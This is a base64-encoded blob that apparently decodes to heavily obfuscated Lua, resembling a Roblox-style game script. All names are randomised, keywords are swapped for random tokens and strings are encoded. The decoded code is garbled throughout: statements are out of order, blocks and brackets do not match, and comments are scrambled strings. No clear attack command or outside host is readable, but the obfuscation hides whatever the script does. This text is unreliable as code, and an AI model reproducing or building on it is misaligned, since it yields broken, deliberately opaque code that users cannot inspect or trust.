azpWd0l2aEV3Tkt2KCgoSUVUc2hmUWJDeClbInphUGJoVGhiUm4iXSgidmtNS0JxZ0VUcj0iKSkpIEpkbGxkZkZ5d1ggWFVEbmVUeWNzazpWd0l2aEV3Tkt2KCgoaUhpZkhWa2twUSlbInphUGJoVGhiUm4iXSgiQVVSZVhmemtYcT09IikpKSB0aGVuCgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBsb2NhbCBNcVpiTGJKZklJID0gVFhIa1VGS2pIVS5QWVdpRExZZFBDLkpNWlVIQk9jeWo6Wndvb1NpalVISygoKGN5SWpHeFJxUkopWyJ6YVBiaFRoYlJuIl0oIm5SSktHR0lIYnI9IikpKQogICAgICAgICAgICBsb2NhbCBIV1NTa0FHdVp1ID0gVExIV3FUbnlGSi5WUlNNaEpnTVFjKHFBQUN4ZXBjQkEoKSAtIGZvemFIUGxFSVcpCgogICAgZW5kCiAgICAgICAgICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oKQogICAgICAgIHJldHVybgogICAgICAgIEFEQ25TR25ydFEuQ0V4a2dSbkRURTpramFxanpEbkJsKGZ1bmN0aW9uKFNaYUNLZ1RtU0kpCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoenVIdFJhUHhRZClbInphUGJoVGhiUm4iXSgiT2JUeGVLUGpUdT09IikpLAp9KQogICAgZHlsTUt4Z2VMSiA9IElXREpQQ2Rndkcuc3dEcHdjeU1vRzpramFxanpEbkJsKEljYlFMcVVDenopCgoKCiAgICAgICAgZW5kCgoKCiAgICAgICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBqd1F4eEpYaG9tID0gVFhIa1VGS2pIVS5QWVdpRExZZFBDLkpNWlVIQk9jeWo6Wndvb1NpalVISygoKFBWd3VlS1FudkcpWyJ6YVBiaFRoYlJuIl0oIm5tUm5Yc2tRTW89PSIpKSkKICAgIHN4RkhSVEtrSW0gTHp1b2NWRHNHciBIR0lyUXZ6T3l1Olp3b29TaWpVSEsoKCh1ZlVyRXd6WlRnKVsiemFQYmhUaGJSbiJdKCJRTGFFSEJYRmxpPT0iKSkpIEx6dW9jVkRzR3IgSEdJclF2ek95dS5QeG94Z1FlTmNWOlp3b29TaWpVSEsoKChhU1pnc1JiUHJtKVsiemFQYmhUaGJSbiJdKCJ3UHBETmhDUUlTPSIpKSkgTHp1b2NWRHNHcgpsb2NhbCBXTU9qZ21YbFdIID0gU1V5WFd3WEZJdC54aFRvZ2plaWZoKCgoZXhUdGNFcGtrbylbInphUGJoVGhiUm4iXSgicWVzbHl5Vk5iQyIpKSkKICAgICAgICBYWlRTUEJ6VVZPIE1wS2FtVkdtWGosIElvYlNlamlOR1IgbXRwZENFY0VEaiBkSVZRTkl3WGxLKGZiVHVhWkpYaEMpIHBZaWlXWkdVQnIKCiAgICAgICAgICAgICAgICAgICAgaWYgWFVEbmVUeWNzazpWd0l2aEV3Tkt2KCgoUW9IVmVkR3dpSylbInphUGJoVGhiUm4iXSgiaVBLckNWaXd6TT0iKSkpIEx6dW9jVkRzR3IgWFVEbmVUeWNzay5ZZnV3cmFkVHh6ID09IHRydWUgdGhlbgogICAgICAgIGxhd2tXQVZVaFogPSAoKFNiUlNOcEdlbmgpWyJ6YVBiaFRoYlJuIl0oIktuc3dOZ2lyZUQ9PSIpKSwKICAgICAgICAgICAgICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oMSkKWFVCQm5rQUV6dy5zakhlcEFKTUF5ID0gMQogICAgICAgICAgICAgICAgbG9jYWwgcENud0RlZ0tRbiA9IG1mU3ZWdkVYcEs6Wndvb1NpalVISygoKG1xZHd4a09mdWQpWyJ6YVBiaFRoYlJuIl0oInJUUnJKS1hCbHoiKSkpCi0tIENTbUJLa0tHSnAga0hLWVZFRUZJYiBkcW9wREZEaXdKIElvYlNlamlOR1IgRG12dExMTExKciBTREJlbldHSFhWCi0tIENTbUJLa0tHSnAgcGFKWVVSTWNLSAogICAgICAgIFdaSUtmWERtZ0ogPSAoKHJ4YmRVWEVSSFYpWyJ6YVBiaFRoYlJuIl0oIldJTUNjZmlFTlE9IikpCiAgICAgICAgTVpOUUhnemFteChXcUJXVXZqckhTLmhJQ3JBWlVxbGQpCgogICAgICAgIC0tIHhOdUtpenJtSG4gQUJJQWVCZVdtTyBjdGNmUnJrY1FrIENFem5LUHdXbFUgWWlzV2hzU05BWiBLcXBuY0JGQ3lvIHJLWGlJTERoemkKICAgICAgICAgICAgICAgICAgICAgICAgdnl6UGFkc2xFYSA9IDEKICAgICAgICBlbmQKICAgICAgICAgICAgewogICAgbG9jYWwgV3FCV1V2anJIUyA9IEhXdnFFVmlIbU06Wndvb1NpalVISygoKFFKVVBVWUJpU0opWyJ6YVBiaFRoYlJuIl0oImNQY25mdlR5VkU9PSIpKSkKICAgIGdEWnFoVG1wcWcKZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBsYXdrV0FWVWhaID0gKChsU1VqcWRxa2V6KVsiemFQYmhUaGJSbiJdKCJEQWlRVkFsYURBPT0iKSksCiAgICAgICAgICAgICAgICBkR2ZwVVpJREVGIEN6d3hVb2haWE8gPT0gKChJZ3pxcldMUXdGKVsiemFQYmhUaGJSbiJdKCJvWGpjaGNUbXh2IikpIHBZaWlXWkdVQnIKCikKICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgZ0RacWhUbXBxZwogICAgICAgICAgICAgICAgbGF3a1dBVlVoWiA9ICgoWWhReUVCQ0x5WSlbInphUGJoVGhiUm4iXSgiWmllbER4RlBwVD0iKSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gclZBbnNxSG55ViBLcXBuY0JGQ3lvIE1YT0dHZGxTVmEsIEFCSUFlQmVXbU8gSm5rSHZkSmtWTyBWWFVCVGF1TnBmIGN0Y2ZScmtjUWsgalBlZWJzYldrTSBDRXpuS1B3V2xVICgyMCBRbkJrdUNqVmpLKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgWmx3YXJSb25pVigoKGJvS1ZDWlJEUnopWyJ6YVBiaFRoYlJuIl0oIkV3WFJtbFVZdWE9PSIpKSkKICAgICAgICBlbmQKICAgIGxvY2FsIEp6TUJyUmFEQWUgPSBUTEhXcVRueUZKLlZSU01oSmdNUWMocVVZYUxrRk9lTyAlIDYwKQogICAgSUNHdkV2a2xJei5ZZnV3cmFkVHh6ID0gdHJ1ZQogICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKHRIZW92aEprUkEpCiAgICAgICAgZW5kCmxvY2FsIHpaRXNDRkhobUogPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChoa2pyY2FuZFltKVsiemFQYmhUaGJSbiJdKCJEdU5XbkdKWm9RPSIpKSkKICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCi0tIHFLd1VhaVZqc0kgSkphcVhySWdHViBVeEJTalltVXJsCiAgICBsYXdrV0FWVWhaID0gKCh3QUlRbkF6Yk9NKVsiemFQYmhUaGJSbiJdKCJJdmJZdVJlVkNDPSIpKSwKICAgIGZ1bmN0aW9uKCkKLS0gUnVWVW5YaVRlUC54Qm1wcXJLbGxLID0gUWViaG5iVEVuQgogICAgICAgICAgICAgICAgZ0RacWhUbXBxZwogICAgICAgICAgICAgICAgZEdmcFVaSURFRiBvWGllR05SY2RWKFBRVUVpUkJzd2opIHBZaWlXWkdVQnIKKQoKLS0gLy8gLy8gLy8genp2anF1YkpmeCAvLyAvLyAvLyAtLQogICAgICAgIE1xWW94RG9zSkcgPSAoKHl1Z3FqY2tGQlcpWyJ6YVBiaFRoYlJuIl0oIkRDTm5nQ1dsQ0I9IikpLAogICAgWnpUQWlYZ2RvbiA9IEhUYkdhTXpiVlc6THJkZGdHTVpkayh7bGF3a1dBVlVoWiA9ICgoTmZnSWFtaG9hbilbInphUGJoVGhiUm4iXSgidGhnV1RxbHdZYz09IikpLCB4UmpZQW9rdWFpID0gKChMQ09xcGhDT3B0KVsiemFQYmhUaGJSbiJdKCJFSmJtTFdYZWxvIikpfSksCmVuZAopCi0tIGxvY2FsIEhVZlVEVUlWcnIgPSBTVXlYV3dYRkl0LnhoVG9namVpZmgoKChuaFZuV2hQR254KVsiemFQYmhUaGJSbiJdKCJia1dNSGJ2bUVTPT0iKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIEFOT1hJT1hRVnYub1FnQ3RXc1Rtai5zZHllbVhlc0FDOm1NV3JGbUhPdFUoKQogICAgICAgIGNYU0RVcXd3bEQub1lIa2xHdFlUczpSWXdBYkRGZmlJKAogICAgICAgIE5RWlVIUFdETW8gPSBmdW5jdGlvbigpCiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBndmhlamZOdkRoIGNYU0RVcXd3bEQuR1J6Y21Sc2lYQyA9PSAoKHhLdGRlVGlTakMpWyJ6YVBiaFRoYlJuIl0oInpvUWZlYktFaEU9PSIpKSB0aGVuCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICBNanppV3ptQ3JXID0gMQogICAgICAgIHZHTGxCeldnQ2ogPSBmYWxzZQpsb2NhbCBBU2pLWXZsZk9lID0ge30KCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHFzbEdCc0hHQlYgbUhMRVlDWGxORzpad29vU2lqVUhLKCgoQnpDUktmdmRvWClbInphUGJoVGhiUm4iXSgiWFBGSVl0cVl5Sj09IikpKSB0aGVuCiAgICAgICAgICAgICAgICB5SllHZFZqemVHLlNUQmJIQmdmS0soRmR2VGVvcXdEQywgSW9iU2VqaU5HUikKICAgICAgICBsb2NhbCBncmlneXZ5QVdHID0gWGdvdkRoeVRiWS5udmRxZHVoeVdCW0trek9pU0Jqc2wuVXVXS0hCcWxCZV0uVEdaeVV5SHBhTi5Oakh2TGlIZHBZCiAgICAgICAgaWYgUk1XV0tmV21Nei5SRlJ3U0dmbkp5LndTUU9pUGNIa0kgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbWJlT1pwRXdYeS5MS2pCRm9TQ2ZlOmtqYXFqekRuQmwoZnVuY3Rpb24obUVuSEVnT0ptWikKICAgICAgICAgICAgZW5kCmxvY2FsIFlFVXp0ZGZDd0YgPSBuaWwgLS0gTUNad3pvY2prYSBXTkVzR3hoTXJBIFhMbkZUYWtMaEYgbEdrenN6c0FvZiBZaXNXaHNTTkFaIEtxcG5jQkZDeW8gU1dLR0tnWE1pcSBieGxKVGVrWk5GIG1wV1ZDYkNVSW4KICAgICAgICAgICAgICAgIGVuZApsb2NhbCBySFVpSVlXZkZyID0gU1V5WFd3WEZJdC54aFRvZ2plaWZoKCgoZXhUdGNFcGtrbylbInphUGJoVGhiUm4iXSgicWVzbHl5Vk5iQyIpKSwgSEdJclF2ek95dSkKICAgIGZ1bmN0aW9uKCkKdVZGWXRZeWR0bzpNV2RjQVN6UG5UKCgoU0ZManBTcUVQUClbInphUGJoVGhiUm4iXSgiVE5LVnFkQ29xVSIpKSkKICAgICAgICBUaHNNUm1GVmh0ID0gUk1XV0tmV21Nei5lYnhYR2hhWFFlLndTUU9pUGNIa0kKClRucmlPVkZKT1Q6Ull3QWJERmZpSSgKICAgIGxvY2FsIHNGd3hVaHJFbVkgPSBQWVdpRExZZFBDIEx6dW9jVkRzR3IgUFlXaURMWWRQQzpCU2lEbVNLSFNzKCgoRnFGdUdTcUlmUSlbInphUGJoVGhiUm4iXSgiTkZMVWp4RWRORj09IikpLCA1KQogICAgICAgICAgICAtLSBIRENEbHZWT1B5IG1VU3hlVmtuRkggamxoQ1hlQmR3UiBBUEtLakFkRWp5LCBwb0Z3TkxUQVBTIFpTeUhQa3RRV2MgR1VzTlp5cE1Jcgpsc0VYTGdxdHRPOlJZd0FiREZmaUkoCmxvY2FsIHJsQllDT0FQTUUgPSBWUG1Ra2JIWGxwLkhXdnFFVmlIbU0gTHp1b2NWRHNHciBWUG1Ra2JIWGxwLkhXdnFFVmlIbU06Wndvb1NpalVISygoKEFheGVCSm5zeGspWyJ6YVBiaFRoYlJuIl0oInlSRmZSek5ReXQ9IikpKQogICAgICAgICAgICAgICAgICAgIEFhd29jR2xNRWEueEZGWXBua0dYSS5YbUhydlN3S1VJID0gKChMbm5rVFpjeE92KVsiemFQYmhUaGJSbiJdKCJ1dEdhRVB3VkprIikpCgogICAgICAgIGdYZVREV1V3V006dm5XU2h4TWN0bSgpCiAgICAgICAgICAgIGlmIEFEQ25TR25ydFEuVXVXS0hCcWxCZSA9PSAoKFJvS0pyanp4cHUpWyJ6YVBiaFRoYlJuIl0oIkJmV2dwclJRblA9PSIpKSB0aGVuCmxvY2FsIG9jTHd3U2JGd3YgPSB7fQogICAgaHhnSVV5Q1VzTyA9IGZhbHNlLAogICAgICAgICAgICAgICAgaWYgd1NRT2lQY0hrSSBMenVvY1ZEc0dyIFdxQldVdmpySFMgdGhlbgogICAgZW5kCgpYZlFtTHhiY1ZtOlJZd0FiREZmaUkoCiAgICAgICAgaWYgQ3p3eFVvaFpYTyA9PSAoKElnenFyV0xRd0YpWyJ6YVBiaFRoYlJuIl0oIm9YamNoY1RteHYiKSkgTHp1b2NWRHNHciBEdHBWTmxhbHJJLndTUU9pUGNIa0kgPT0gKChqcEFzTElMYnRyKVsiemFQYmhUaGJSbiJdKCJvbGZwTWF2ZXZrPT0iKSkgdGhlbgpmdW5jdGlvbiBoT3pDR0hWSEFXKEdsTG14VU5xeG8pCiAgICBlbmQKICAgICAgICAgICAgaWYgY3lZVXdRWkx5eSBMenVvY1ZEc0dyIGN5WVV3UVpMeXk6Wndvb1NpalVISygoKFFKVVBVWUJpU0opWyJ6YVBiaFRoYlJuIl0oImNQY25mdlR5VkU9PSIpKSkgdGhlbgogICAgKChXQkZkVnJ5ZVZYKVsiemFQYmhUaGJSbiJdKCJic05zUWxCTWp5PT0iKSksCgotLSBjYnpGeGJmWE5yIGNOd1lKdVdVQWIgRnJHeE13aHhnWiBrSEtZVkVFRkliIGZsRlF5U2VRQk0KICAgIHFxTGFVTWVuaXAgPSB6WHFaYWN2UVBhLAogICAgICAgICAgICBpZiBQek9mZkVwemJqOlZ3SXZoRXdOS3YoKChydU5KZGhLSnNZKVsiemFQYmhUaGJSbiJdKCJxSlFSUGxRT3F5PT0iKSkpIHRoZW4KICAgICAgICBoRXRlbEtzRW92OlBjbWRZd1pPc3YoI3RsdHVSbHJ6c2EgPiAwIEx6dW9jVkRzR3IgdGx0dVJscnpzYSBKZGxsZGZGeXdYIHsoKE5LTlVpR21WZVYpWyJ6YVBiaFRoYlJuIl0oIklrbVp6Z3BhdEE9PSIpKX0pCiAgICAgICAgICAgICAgICBGZ0xuVnhJZWtzLlhaanhKQlJvSXEgPSBha1JCbXBGV0h2LkFndWZac2FUQnkoMjU1LCAyNTUsIDI1NSkKICAgICAgICBwWkFDTW94YUtEID0gd1NRT2lQY0hrSQplbmQKICAgICAgICAgICAgbFZwU2VlZU9pQwotLSBLZndIUGREQ29pIGtIS1lWRUVGSWIgaGF0dGtGand2cyBETERoTlpwbmR4IChvSERUWGdVVnVoIGtzYmRaeVp0UXAgYnBZaW1RandGVSBXYWZEaVRYalpQICYgSHdyTldUZmdVRikKICAgICAgICAgICAgICAgIG9FTE9WRmhTV3ggPSAoKFpqaG5lanR6a0YpWyJ6YVBiaFRoYlJuIl0oInladWtlYXJ5T3c9IikpLAoKICAgICAgICAgICAgICAgICAgICBlbmQKICAgIGlmIHFzbEdCc0hHQlYgc0Z3eFVockVtWSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ0RacWhUbXBxZwogICAgICAgICAgICAgICAgICAgIGp3UXh4Slhob20gPSBUWEhrVUZLakhVLlBZV2lETFlkUEMuSk1aVUhCT2N5ajpad29vU2lqVUhLKCgoekRWT0F6R3ZwSClbInphUGJoVGhiUm4iXSgicGxMYVJpWkRBcj09IikpKQpsb2NhbCBFU2hYSFJxSHBKID0gUW5MWGlWVk9Vai5ZRnFsZVFZb252OmZJV0RBT3BCeEYoKChid1FibXl3bk9GKVsiemFQYmhUaGJSbiJdKCJPdm5kRUxVc1VvPSIpKSkKICAgICgoTFhzRG5JcUxTTClbInphUGJoVGhiUm4iXSgia21hcU9jR0tyZT09IikpLAoKICAgICAgICAgICAgICAgIE5zamlpc1FGTlguYlRkZ0htRVVpTC5YbUhydlN3S1VJID0gKChKVEpiTG5SWG9IKVsiemFQYmhUaGJSbiJdKCJDUG1nSVFWelNlPSIpKQotLSBDU21CS2tLR0pwIGtIS1lWRUVGSWIgRFBvY1Jyd3ZqaQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTygpCiAgICAgICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTyhGR05LZlpGUkNpKSAtLSByZ2VGYmdZZXN4IEZHTktmWkZSQ2kgSWFsakV1bVRHeSBoQ2FsRXJEZkZECmxvY2FsIHp5Wk1WblFHdUYgPSBmYWxzZQogICAgeW1EY0F5aEZrSy5MSUJ2aWtKdmtYID0gRnFMSHRScnVmRgpsb2NhbCBaZEJlRmpZcFp4ID0KICAgIH0KICAgIH0KLS0gTWtvWkJiS1Z6ZAplbmQKICAgIHsKICAgICAgICBsb2NhbCBGZHZUZW9xd0RDID0ge30KICAgIGxhd2tXQVZVaFogPSAoKGlwS1VPTlFnT2EpWyJ6YVBiaFRoYlJuIl0oIllnUVZob2liQ0k9IikpLAogICAgICAgICAgICAgICAgZW5kCi0tIFphR1BZZGZoSFIga0hLWVZFRUZJYiBuZkFGTE50U0JBIGdzYVpWTklwS24KICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIGxvY2FsIGp3UXh4Slhob20KICAgICAgICAgICAgICAgICAgICAtLSByVkFuc3FIbnlWIElvYlNlamlOR1IgRmxoVXV5V3JubCwgV3hkcUVoWHJoYSBJb2JTZWppTkdSIFJYT0JLc25UVG4KICAgIGZ1bmN0aW9uKHRIZW92aEprUkEpCgogICAgICAgIHZHTGxCeldnQ2ogPSBmYWxzZQpSTVdXS2ZXbU16LlJ3d1Z6VGRMQ3M6a2h2bENydGhCYShmYWxzZSkKICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgamNiUHFnZ1NhcS5vUWdDdFdzVG1qLlF0VkxSanpxZ2Q6bU1XckZtSE90VSg5OCwgMSkKCiAgICAgICAgaWYgVGhzTVJtRlZodCB0aGVuCiAgICAgICAgICAgICAgICAgICAgLS0gWmx3YXJSb25pVigoKENsT21ZbHJnbWMpWyJ6YVBiaFRoYlJuIl0oInBPR1hCaVp2RGwiKSksIEFEQ25TR25ydFEuVXVXS0hCcWxCZSkKCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgWFpUU1BCelVWTyBwUnpxTGJUTGpJLCBYVURuZVR5Y3NrIG10cGRDRWNFRGogQUdXZmVSU1JCSywgbGpQRnl4c2FMdyBwWWlpV1pHVUJyCiAgICBsb2NhbCBMT1dadFZMUkhPID0gc0Z3eFVockVtWTpFYXRPaWZYTFpVKCkKICAgICAgICAgICAgICAgICAgICBndmhlamZOdkRoIGNYU0RVcXd3bEQuR1J6Y21Sc2lYQyA9PSAoKFpEVlhXamN1YVApWyJ6YVBiaFRoYlJuIl0oImtlY0hodlFHeG49IikpIHRoZW4KbG9jYWwgaEV0ZWxLc0VvdiA9IFFuTFhpVlZPVWouWkVOT2pCcWZqSDplTUlCa3NMb0RSKCgoenBCQ3pQSXhjaSlbInphUGJoVGhiUm4iXSgiTlVoZ1Z1d3NFaiIpKSwgewotLSB6SFJSUHJ0Qm1FCiAgICBsYXdrV0FWVWhaID0gKChmZXhKSXpxYUxBKVsiemFQYmhUaGJSbiJdKCJjc2hkUUpOd0tZPT0iKSksCiAgICBmdW5jdGlvbih0SGVvdmhKa1JBKQogICAgREtmS1JYaldSZTpTY1NEaUR1T1pzKCgoSlV4ZVJYdGVsaylbInphUGJoVGhiUm4iXSgiY05idnFRQUJPST09IikpKTpwd1lIa1JReUhmKHRydWUsICgoRWxHbFd6ckFvUSlbInphUGJoVGhiUm4iXSgiSG5NTlFiQlBmZj0iKSksIGZhbHNlLCBES2ZLUlhqV1JlKQpsb2NhbCBpTG5HeGRkaEFqID0gREtmS1JYaldSZTpTY1NEaUR1T1pzKCgoa0JkYUVPYWRzQilbInphUGJoVGhiUm4iXSgicnFTanpZWUhORz09IikpKQpIR0lyUXZ6T3l1LklWcUt6VGtSck86a2phcWp6RG5CbCgKICAgICgoYUhaS3JPTldueilbInphUGJoVGhiUm4iXSgidG9ua0dmb0lxYSIpKSwKICAgICAgICBETG9qZ1JHd3d3OnZuV1NoeE1jdG0oKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kLAogICAgICAgIGxvY2FsIHNOb2VodU1kYVMgPSBLcEJJYXNjZ0xGKCgodVJ0ZWxjU3FDWilbInphUGJoVGhiUm4iXSgiWGZ2b1ptam5NYT09IikpIC4uIGFCUWVYc2Rya3YpCiAgICAgICAgZW5kCgogICAgLS0gS0pvanFEUGZicSBTd0tab3BTTFNOIGVhQXBrVHB6RVogUHNlZ2V4cGRNUwogICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGlmIGdyaWd5dnlBV0cgdGhlbgogICAgICAgICAgICAgICAgICAgIFpsd2FyUm9uaVYoKCh5aHVLc2t5bFNuKVsiemFQYmhUaGJSbiJdKCJ3Umxac1lSWWVYPSIpKSAuLiBlRUZKT0xJUXdjKQogICAgICAgIHZHTGxCeldnQ2ogPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFF4cHpLQkljZmIgdGhlbgoKICAgICkKICAgIFFuTFhpVlZPVWouREdWbmtOaWtoUzpodWV2SFl0bFRHKAogICAgfQogICAgICAgICAgICAtLSBNQ1p3em9jamthIFdORXNHeGhNckEgWExuRlRha0xoRiBsR2t6c3pzQW9mIFpzWEhrdFBEaXIgWnlmd2ZGU0JrbyBuZWpMY2xXZUlICgogICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIEFEQ25TR25ydFEuVW5WZktnUWFabCA9IHRydWUKICAgIGVuZAogICAgdkdMbEJ6V2dDaiA9ICgoY3R4WHZCV25HaClbInphUGJoVGhiUm4iXSgoKFJjY2dCa0JRWHMpWyJ6YVBiaFRoYlJuIl0oKChUc3V5YXRNcFJSKVsiemFQYmhUaGJSbiJdKCgoekVFQ3lPZU5FQylbInphUGJoVGhiUm4iXSgoKEhiUVRsempTb0opWyJ6YVBiaFRoYlJuIl0oKChGVkxtcnFRVEphKVsiemFQYmhUaGJSbiJdKCgoTkZsR0NUUXp5cSlbInphUGJoVGhiUm4iXSgiIikpKSkpKSkpKSkpKSkpLApRbkxYaVZWT1VqLk1JeUZDeVd5Sk86VnBjT25LdVdKTyh7Ci0tIFJ1VlVuWGlUZVAudnl6UGFkc2xFYSA9IDAuMQogICAgdkdMbEJ6V2dDaiA9ICgoWktiVUxMekNVbilbInphUGJoVGhiUm4iXSgiTFBuZXpMT2NIaD09IikpLAogICAgZW5kCiAgICBlbmQpCgogICAgICAgIGxhd2tXQVZVaFogPSAoKFpHU2t1enZvTFopWyJ6YVBiaFRoYlJuIl0oInFxaVJ1aVVYaUg9IikpLAogICAgICAgICAgICAgICAgICAgIEN3VGxwRlFEd3QgPSB0SGVvdmhKa1JBCiAgICAgICAgbG9jYWwgaFVPanVUd09qTyA9IHsgWzFdID0gamNiUHFnZ1NhcSB9CiAgICAgICAgICAgIC0tIHNiUEF1RnlIQ2QgdU5LTnNGZmthciBac1hIa3RQRGlyIEtxcG5jQkZDeW8gWk1WdUZUWmZrcQogICAgbG9jYWwgZnVuY3Rpb24gb2pJV2Z6UmF4RihDQ3F5ZUpLSHVxKQogICAgICAgIGVuZAogICAgbG9jYWwgWllZQnJnVEpGWiA9IFhnb3ZEaHlUYlk6QlNpRG1TS0hTcygoKG50RmVBa3FLU1cpWyJ6YVBiaFRoYlJuIl0oImZ3UlRjeUxYREQ9IikpKTpCU2lEbVNLSFNzKCgobVlqdUVhY3VBdylbInphUGJoVGhiUm4iXSgieUtDSU5HWFdXaSIpKSk6QlNpRG1TS0hTcygoKHZVb3BiZnN4Q2UpWyJ6YVBiaFRoYlJuIl0oIk5zbUpMWmZaeEY9IikpKQogICAgICAgIFdaSUtmWERtZ0ogPSAoKFZyY0RRbUp5SUspWyJ6YVBiaFRoYlJuIl0oImlheldjSnBiYlQ9PSIpKQogICAgICAgICAgICBpZiBaZHNsbFhSZlpqIHRoZW4KCgp1VkZZdFl5ZHRvOlhrZ3JCYkRranAoUW5MWGlWVk9Vai5HVUFRV2NlWlViKQogICAgICAgIE5RWlVIUFdETW8gPSBmdW5jdGlvbihoQ2FsRXJEZkZEKQogICAgICAgIEtrek9pU0Jqc2wuSFd2cUVWaUhtTS54SGxleUNTQ0F5Lm1EdU1lQmRxcHogPSB0SGVvdmhKa1JBCgogICAgZnVuY3Rpb24odEhlb3ZoSmtSQSkKICAgICAgICByQ254R3RsQ1hROk9weU5QUmVScFgoMCwgMCwgMCwgdHJ1ZSwgREtmS1JYaldSZSwgMCkgLS0gdFVmUUN2YkJpSiBuYm5rT0dsVlJVIEx4ZnlMSVJ5TUsKICAgICAgICBNcVlveERvc0pHID0gKChLUmNBQ0NwdlhSKVsiemFQYmhUaGJSbiJdKCJSdXpWaFJZbXV0PT0iKSksCgogICAgbG9jYWwgSFd2cUVWaUhtTSA9IEtrek9pU0Jqc2wuSFd2cUVWaUhtTQpYbUlIR09oRXdnOlJZd0FiREZmaUkoCiAgICBNSXlGQ3lXeUpPID0gSFRiR2FNemJWVzpMcmRkZ0dNWmRrKHtsYXdrV0FWVWhaID0gKChtbm1ZeU5HcGxGKVsiemFQYmhUaGJSbiJdKCJtckF2SFFGU1NFPT0iKSksIHhSallBb2t1YWkgPSAoKFZyekJOdlh0S0UpWyJ6YVBiaFRoYlJuIl0oIlB5U3RhZFFVZkYiKSl9KSwKICAgICAgICAgICAgICAgICAgICBpZiBXeVpRVUFTeUd4IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgandReHhKWGhvbSA9IE1xWmJMYkpmSUkKICAgICAgICAgICAgICAgICAgICAgdGhlbgpXTU9qZ21YbFdILk9PZ1ZpQnZXSkggPSBmYWxzZSAtLSBNakRSUlRvSk1lIHpodlZnZFVyV1UgRFFDcFRsSVFTSyBZaXNXaHNTTkFaIFdidU1Ub2FudEUgQ0V6bktQd1dsVQogICAgICAgICAgICAgICAgICAgIGlmIGxpaHdCeXROanggdGhlbgogICAgICAgICAgICAgICAgZ3hERkNUSEtnaCA9IHpuTEVuTGZBb1QublB6bklJSEVMSyhFVld1ekRyQ3BkKQogICAgcXFMYVVNZW5pcCA9IEFTaktZdmxmT2UsCiAgICByb2lLWWtyWEh0LlFiWXlFckFjbEsgPSBBYXdvY0dsTUVhOlp3b29TaWpVSEsoKCh6Y3NVYmxrVnNWKVsiemFQYmhUaGJSbiJdKCJLdWZGcldsVlBHIikpKSBMenVvY1ZEc0dyIEFhd29jR2xNRWEuU2pSZ3JiUG1May5YbUhydlN3S1VJIEpkbGxkZkZ5d1ggbmlsCiAgICAgICAgICAgICAgICBlbmQKCi0tIC0tIHNuWGN5SW9LSlUgWU9CSWJZWXdkcQogICAgWUZxbGVRWW9udiA9IEhUYkdhTXpiVlc6THJkZGdHTVpkayh7bGF3a1dBVlVoWiA9ICgoaE5PRmdOQVdWcylbInphUGJoVGhiUm4iXSgiRnJVTUtXR2VWcz09IikpLCB4UmpZQW9rdWFpID0gKChHS3hKeXNTWUNaKVsiemFQYmhUaGJSbiJdKCJTWnlDYmlvVHR4IikpfSksCiAgICAgICAgewogICAgICAgIHZ5elBhZHNsRWEgPSAwCmxvY2FsIHpYcVphY3ZRUGEgPSB7fQogICAgICAgICAgICAgICAgWlpydmlYTGNBTCgoKHRDREJVdFZzSE8pWyJ6YVBiaFRoYlJuIl0oIm5FU3dQZ0laTHI9IikpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgckNueEd0bENYUTpwd1lIa1JReUhmKHRydWUsIFdqWXJaa2hLVk0uQ3VQa0Jud2ppeS5vaFVSS01qckVnLCBmYWxzZSwgREtmS1JYaldSZSkKCiAgICAgICAgICAgIGRHZnBVWklERUYgaGZtc3lUV2t1UiBMenVvY1ZEc0dyIGhmbXN5VFdrdVI6V3h5SWJyVFdZSihLa3pPaVNCanNsLkhHSXJRdnpPeXUpIHBZaWlXWkdVQnIKICAgIFFuTFhpVlZPVWouWnpUQWlYZ2RvbjplTUlCa3NMb0RSKAogICAgICAgICAgICBlbmQKICAgICAgICBaWVlCcmdUSkZaOm1NV3JGbUhPdFUod0hEbURTUGF3UihoVU9qdVR3T2pPKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIFVXZnlCbFFXdWkgTHp1b2NWRHNHciBVV2Z5QmxRV3VpLkhXdnFFVmlIbU0gdGhlbgogICAgICAgICAgICAgICAgaWYgek9kd21GdkxKVyB0aGVuCikKICAgIGZ1bmN0aW9uKFB6T2ZmRXB6YmopCmxvY2FsIGFLcW5pS3R3S0MgPQogICAgICAgIGxhd2tXQVZVaFogPSAoKFhDQmpjQUtrYU8pWyJ6YVBiaFRoYlJuIl0oImxRdGVQWlNvZFE9IikpLApRbkxYaVZWT1VqLkhkdG9DcHVKeEM6ZU1JQmtzTG9EUigoKEJPTXNUbWVOekgpWyJ6YVBiaFRoYlJuIl0oImVwd0pIaFBXQU89PSIpKS